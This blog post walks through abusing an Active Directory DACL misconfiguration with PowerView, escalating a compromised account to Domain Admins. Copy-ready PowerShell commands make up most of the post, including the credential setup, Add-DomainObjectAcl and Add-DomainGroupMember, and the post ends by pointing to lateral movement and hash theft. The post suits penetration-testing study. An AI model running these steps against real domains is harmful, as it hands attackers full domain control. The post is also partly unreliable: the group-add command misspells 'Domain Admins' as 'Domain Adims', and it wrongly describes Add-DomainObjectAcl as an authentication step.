---
author: Chris
title: "Quick Pointer: Abusing DACL Fumbles using PowerView"
date: 2024-12-12
tags:
  - powershell
---

{% imagesmall '/img/2024-12-11_10-09.png', '' %}

Ever come across an edge description in Boodhound on DACL abuse? They tend to look something like the above.

The Windows abuse instructions on the edge tend to offer two ways to proceed, either using _net group_ from net.exe or PowerView. I've always used the net.exe method, but they recommend PowerView because the opsec for net.exe is challenging.

{% imagesmall '/img/2024-12-12_08-59.png', '' %}

I was curious to play around with PowerView's _Add-DomainGroupMember_ to have another option in my toolbox and find out more about this improved opsec. Unfortunately, I've run into this Bloodhound description enough times to know that the steps for the PowerView method aren't quite as clearly laid out in the Bloodhound description as they could be. I don't think it's Bloodhound's fault, as the {% linkprimary "original instructions", "https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/" %} aren't effusive by any means.

## Adding an Existing User to Domain Admins by Modifying the DACL

To make it clearer, here are the steps to follow on a compromised domain-joined target. This will add an existing user (for which you have obtained a password), who already has DACL privileges over the Domain Admins group, to the Domain Admins group itself. For the sake of this example, lets say the user credentials we've compromised and want to add to Domain Admins is `paul.atreides:spicyworm` on a domain with a short name of _arrakis_.

First, it might pay to ensure you're authenticated to the Domain Controller as a member of the domain. Set up the creds as variables in Powershell and then use _Add-DomainObjectAcl_ to authenticate.

```
$SecPassword = ConvertTo-SecureString 'spicyworm' -AsPlainText -Force
```

```
$Cred = New-Object System.Management.Automation.PSCredential('arrakis\paul.atreides', $SecPassword)
```

```
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -PrincipalIdentity paul.atreides -Rights WriteMembers
```

I'm no PowerShell expert, but you probably don't need to reenter the following two variables again. I'm doing so for the sake of effectiveness.

```
$SecPassword = ConvertTo-SecureString 'spicyworm' -AsPlainText -Force
```

```
$Cred = New-Object System.Management.Automation.PSCredential('arrakis\paul.atreides', $SecPassword)
```

Now add the existing domain user, paul.atreides, who has DACL privileges over Domain Admins group, to the Domain Admins group.

```
Add-DomainGroupMember -Identity 'Domain Adims' -Members 'paul.atreides' -Credential $Cred
```

Now you can verify whether the operation succeeded.

```
Get-DomainGroupMember -Identity 'Domain Admins'
```

## Moving Forward

If successful, from there your options should open up a bit to lateral movement, or obtaining hashes among other possibilities.
